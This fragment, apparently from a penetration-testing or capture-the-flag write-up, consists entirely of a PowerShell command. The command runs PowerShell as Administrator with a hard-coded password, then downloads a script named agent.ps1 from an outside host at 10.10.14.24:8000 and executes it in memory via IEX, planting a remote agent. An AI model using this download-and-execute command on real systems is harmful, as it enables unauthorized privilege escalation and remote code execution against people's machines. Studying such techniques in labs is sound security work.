...
Invoke-Runas -User Administrator -Password 3130438f31186fbaf962f407711faddb -Binary C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -LogonType 0x1 -Args "-command IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24:8000/agent.ps1')"
